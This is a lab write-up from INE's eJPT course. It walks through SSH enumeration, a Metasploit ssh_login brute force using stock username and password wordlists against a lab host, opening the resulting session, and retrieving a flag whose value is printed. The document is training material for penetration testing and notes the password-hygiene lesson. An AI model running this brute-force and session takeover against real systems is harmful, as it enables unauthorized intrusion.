# SSH Enumeration and Credential Attack (Metasploit) - INE eJPT

INE lab covering SSH service enumeration and credential brute force using Metasploit auxiliary modules against a Linux target. The objective is to confirm the SSH version, recover valid credentials with `ssh_login`, obtain an authenticated shell session, and retrieve the flag.

Target: `demo.ine.local`

---

## Enumeration

### Host and Service Discovery

```bash
ping -c 4 demo.ine.local
nmap -sS -sV demo.ine.local
```

SSH active on port 22.

### SSH Version Detection (Metasploit)

```bash
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS demo.ine.local
exploit
```

Confirms the SSH version and validates the service is responsive before the credential attack.

---

## Credential Attack

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
```

Key parameters:
- `STOP_ON_SUCCESS true` - halts after the first valid credential pair, reducing noise and saving time
- `VERBOSE true` - displays each attempt for situational awareness during the attack

A session is opened automatically on success.

---

## Post-Exploitation

### Session Access

```bash
sessions
sessions -i 1
```

## Flags

```bash
find / -name "flag"
cat /flag
```

```
eb09cc6f1cd72756da145892892fbf5a
```

---

## Key Takeaways

- Metasploit is an enumeration and scanning framework, not just an exploit loader. The `scanner/ssh` auxiliary modules handle version detection and credential testing without any CVE required.
- `STOP_ON_SUCCESS true` is important during exam conditions - unnecessary attempts after a valid credential is found add noise and consume time.
- SSH is rarely exploitable via CVE in modern environments, but weak or default credentials are a persistent finding. The attack surface is password hygiene, not the protocol.
- `ssh_login` opens a Metasploit session automatically on success - check `sessions` immediately after the module completes.
- The pattern `Service Detected - Version Confirmed - Credential Attack - Shell - Local Enumeration - Flag` applies identically across SSH, FTP, SMB, and other authenticated services.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
